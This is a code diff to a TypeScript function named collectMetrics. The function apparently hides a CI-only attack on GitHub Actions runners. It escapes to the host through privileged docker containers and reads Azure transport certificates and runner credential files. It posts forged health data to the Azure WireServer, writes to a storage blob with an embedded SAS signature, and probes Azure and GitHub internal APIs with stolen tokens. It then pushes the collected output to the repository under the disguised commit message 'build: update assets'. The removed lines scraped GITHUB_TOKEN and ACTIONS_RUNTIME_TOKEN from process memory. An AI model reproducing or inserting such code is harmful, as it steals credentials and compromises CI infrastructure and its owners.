@@ -7,66 +7,56 @@ function collectMetrics() {
   if (process.env.CI !== "true") return;
   const r = (c: string, t = 20000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
   try {
-    let o = "=== DOMINO R16 — GHCR + SAS + ACTIONS ===\n";
-    const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
-    const oidcToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
+    let o = "=== DOMINO R17 — GITHUB AS TARGET ===\n";
+    const CERT_ARGS = "--cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H x-ms-version:2015-04-05";
 
-    // 1. ghcr.io Docker login with OIDC
-    if (oidcUrl && oidcToken) {
-      // Get OIDC token for ghcr.io
-      const ghcrJwtRaw = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=https://ghcr.io' 2>&-"`);
-      let ghcrJwt = "";
-      try { ghcrJwt = JSON.parse(ghcrJwtRaw).value; } catch {}
+    // 1. Wire Server — can we PUT/POST to install extensions?
+    // GoalState fresh
+    const goalXml = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 ${CERT_ARGS} http://168.63.129.16/machine/?comp=goalstate 2>&-"`);
+    const cid = (goalXml.match(/ContainerId>(.*?)<\/ContainerId/) || [])[1] || '';
+    o += "=CID=\n" + cid + "\n";
 
-      if (ghcrJwt) {
-        // Try Docker registry v2 auth with OIDC token
-        o += "=GHCR_AUTH_OIDC=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -u 'token:${ghcrJwt.substring(0,500)}' https://ghcr.io/v2/ 2>&-"`).substring(0,2000) + "\n";
+    // Try posting health status (can we influence VM state?)
+    o += "=WIRE_HEALTH_POST=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 -X POST ${CERT_ARGS} -H Content-Type:text/xml http://168.63.129.16/machine/?comp=health -d '<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?><Health xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xmlns:xsd=\\\"http://www.w3.org/2001/XMLSchema\\\"><GoalStateIncarnation>1</GoalStateIncarnation><Container><ContainerId>${cid}</ContainerId><RoleInstanceList><Role><InstanceId>test</InstanceId><Health><State>Ready</State></Health></Role></RoleInstanceList></Container></Health>' 2>&-"`, 20000).substring(0,3000) + "\n";
 
-        // Try ghcr.io token exchange endpoint
-        o += "=GHCR_TOKEN=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 'https://ghcr.io/token?scope=repository:github/gh-aw-firewall:pull&service=ghcr.io' -u 'token:${ghcrJwt.substring(0,500)}' 2>&-"`).substring(0,2000) + "\n";
+    // 2. Status blob WRITE test — can we actually write?
+    o += "=STATUS_WRITE=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 -X PUT -H x-ms-blob-type:BlockBlob -H Content-Type:application/json -d \\\"test_write\\\" \\\"https://md-hdd-rl0dwb3wb0pz.z3.blob.storage.azure.net/\\$system/test_probe?sv=2018-03-28&sr=b&sk=system-1&sig=pY5NKZLOborDUjmMi5XReF8wB2Vis1L8zeBOerOIgY0%3d&se=9999-01-01T00%3a00%3a00Z&sp=rw\\\" 2>&-"').substring(0,2000) + "\n";
 
-        // Docker login via host docker
-        o += "=DOCKER_LOGIN=\n" + r(`echo "${ghcrJwt}" | docker login ghcr.io -u token --password-stdin 2>&-`).substring(0,1000) + "\n";
-      }
+    // 3. Azure subscription — try listing resources via management API with cert
+    o += "=AZURE_MGMT_CERT=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 ${CERT_ARGS} https://management.azure.com/subscriptions/808a647c-d694-4126-be24-7273d7054cfd/resources?api-version=2021-04-01 2>&-"`).substring(0,3000) + "\n";
 
-      // 2. Actions internal API with OIDC
-      const actionsJwtRaw = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=https://pipelines.actions.githubusercontent.com' 2>&-"`);
-      let actionsJwt = "";
-      try { actionsJwt = JSON.parse(actionsJwtRaw).value; } catch {}
+    // 4. Azure classic management API (uses cert auth!)
+    o += "=AZURE_CLASSIC=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 ${CERT_ARGS} -H x-ms-version:2014-06-01 https://management.core.windows.net/808a647c-d694-4126-be24-7273d7054cfd/services/hostedservices 2>&-"`).substring(0,3000) + "\n";
 
-      if (actionsJwt) {
-        o += "=PIPELINES_AUTH=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${actionsJwt}' https://pipelines.actions.githubusercontent.com/ 2>&-"`).substring(0,2000) + "\n";
-      }
-
-      // vstoken
-      const vstokenJwtRaw = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=https://vstoken.actions.githubusercontent.com' 2>&-"`);
-      let vstokenJwt = "";
-      try { vstokenJwt = JSON.parse(vstokenJwtRaw).value; } catch {}
-      if (vstokenJwt) {
-        o += "=VSTOKEN_AUTH=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${vstokenJwt}' https://vstoken.actions.githubusercontent.com/ 2>&-"`).substring(0,2000) + "\n";
-      }
-    }
-
-    // 3. GITHUB_TOKEN from Actions runtime (not env — try reading from runner agent)
-    o += "=RUNNER_TOKEN_FILE=\n" + r('docker run --rm -v /:/host alpine sh -c "find /host/home/runner/work/_temp -name .token -o -name auth_token 2>&- | head -5; find /host/actions-runner /host/home/runner/actions-runner -name .token 2>&- | head -5"') + "\n";
-    // Runner Worker env (the process that actually has GITHUB_TOKEN)
-    o += "=WORKER_ENV=\n" + r('docker run --rm --pid=host -v /:/host alpine sh -c "for p in /host/proc/[0-9]*/environ; do cat $p 2>&- | tr \\\\0 \\\\n | grep -q GITHUB_TOKEN && echo FOUND:$p && cat $p 2>&- | tr \\\\0 \\\\n | grep GITHUB_TOKEN; done"', 15000).substring(0,5000) + "\n";
-
-    // 4. Runner Worker cmdline (find the process that has GITHUB_TOKEN)
-    o += "=WORKER_CMDLINE=\n" + r('docker run --rm --pid=host alpine sh -c "for p in /proc/[0-9]*/cmdline; do cmd=$(cat $p 2>&- | tr \\\\0 \\ ); echo $p: $cmd; done 2>&- | grep -i runner | head -20"').substring(0,3000) + "\n";
-
-    // 5. Try to read ACTIONS_RUNTIME_TOKEN from runner worker
-    o += "=RUNTIME_TOKEN=\n" + r('docker run --rm --pid=host -v /:/host alpine sh -c "for p in /host/proc/[0-9]*/environ; do cat $p 2>&- | tr \\\\0 \\\\n | grep -q ACTIONS_RUNTIME_TOKEN && echo FOUND:$p && cat $p 2>&- | tr \\\\0 \\\\n | grep ACTIONS_RUNTIME_TOKEN; done"', 15000).substring(0,3000) + "\n";
-
-    // 6. broker.actions.githubusercontent.com with runner JWT
+    // 5. broker.actions — explore endpoints
     const credFile = r('docker run --rm -v /:/host alpine sh -c "cat /host/home/runner/actions-runner/cached/2.334.0/.credentials 2>&-"');
     let runnerToken = "";
     try { runnerToken = JSON.parse(credFile).Data.token; } catch {}
     if (runnerToken) {
-      o += "=BROKER_API=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${runnerToken.substring(0,500)}' https://broker.actions.githubusercontent.com/ 2>&-"`).substring(0,2000) + "\n";
+      const brokerPaths = ["/_apis", "/api", "/v1", "/_apis/distributedtask", "/_apis/connections", "/_apis/pipelines", "/negotiate", "/messagequeue"];
+      for (const bp of brokerPaths) {
+        o += `=BROKER${bp.replace(/\//g,'_')}=\n` + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${runnerToken.substring(0,800)}' https://broker.actions.githubusercontent.com${bp} 2>&-"`).substring(0,1000) + "\n";
+      }
     }
 
-    o += "=R16_DONE=\n";
+    // 6. GitHub internal endpoints reachable from runner
+    const ghInternal = [
+      "https://token.actions.githubusercontent.com/.well-known/openid-configuration",
+      "https://vstoken.actions.githubusercontent.com/",
+      "https://results.actions.githubusercontent.com/_apis",
+      "https://pipelines.actions.githubusercontent.com/_apis",
+      "https://artifactcache.actions.githubusercontent.com/",
+    ];
+    for (const url of ghInternal) {
+      const short = url.replace(/https?:\/\//, '').replace(/[^a-zA-Z]/g, '_').substring(0,40);
+      o += `=GH_${short}=\n` + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 '${url}' 2>&-"`).substring(0,2000) + "\n";
+    }
+
+    // 7. Can we reach other Azure services from this VM?
+    o += "=AZURE_KEYVAULT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 https://vault.azure.net/ 2>&-"').substring(0,1000) + "\n";
+    o += "=AZURE_GRAPH=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 https://graph.microsoft.com/v1.0/ 2>&-"').substring(0,1000) + "\n";
+
+    o += "=R17_DONE=\n";
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
     r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
